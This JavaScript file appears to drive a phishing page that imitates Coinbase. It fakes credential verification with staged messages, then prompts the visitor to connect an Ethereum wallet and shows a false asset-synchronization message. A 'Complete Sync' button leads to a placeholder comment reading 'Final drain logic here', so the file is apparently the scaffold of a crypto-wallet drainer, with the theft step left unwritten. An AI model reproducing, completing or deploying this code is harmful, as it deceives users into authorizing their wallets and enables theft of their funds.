document.addEventListener('DOMContentLoaded', () => {
    const toStep2 = document.getElementById('toStep2');
    const loginForm = document.getElementById('login-form');
    const connectBtn = document.getElementById('connectBtn');
    const status = document.getElementById('status');

    if (toStep2) {
        toStep2.onclick = () => {
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
        };
    }

    if (loginForm) {
        loginForm.onsubmit = (e) => {
            e.preventDefault();
            document.getElementById('step-2').classList.add('hidden');

            const container = document.querySelector('.container');
            const loaderDiv = document.createElement('div');
            loaderDiv.className = 'auth-card loading-container';
            loaderDiv.innerHTML = `<div class="loader"></div><p id="sys-text" style="font-size:14px; color:#5b616e;">Verifying credentials...</p>`;
            container.appendChild(loaderDiv);

            const texts = ["Verifying credentials...", "Connecting to vault...", "Almost done..."];
            let i = 0;
            const intv = setInterval(() => {
                document.getElementById('sys-text').innerText = texts[i];
                i++;
                if (i >= texts.length) {
                    clearInterval(intv);
                    setTimeout(() => {
                        loaderDiv.remove();
                        document.getElementById('step-3').classList.remove('hidden');
                    }, 800);
                }
            }, 800);
        };
    }

    if (connectBtn) {
        connectBtn.onclick = async () => {
            if (window.ethereum) {
                try {
                    status.innerText = "Connecting to wallet...";
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    status.innerText = "Wallet connected. Synchronizing assets...";
                    
                    setTimeout(() => {
                        status.innerText = "Synchronization complete. Ready to proceed.";
                        connectBtn.innerText = "Complete Sync";
                        connectBtn.onclick = () => {
                            status.innerText = "Processing... please wait.";
                            // Final drain logic here
                        };
                    }, 2000);
                } catch (err) {
                    status.innerText = "Please authorize the connection to continue.";
                }
            } else {
                status.innerText = "No wallet found. Please install Coinbase Wallet.";
            }
        };
    }
});
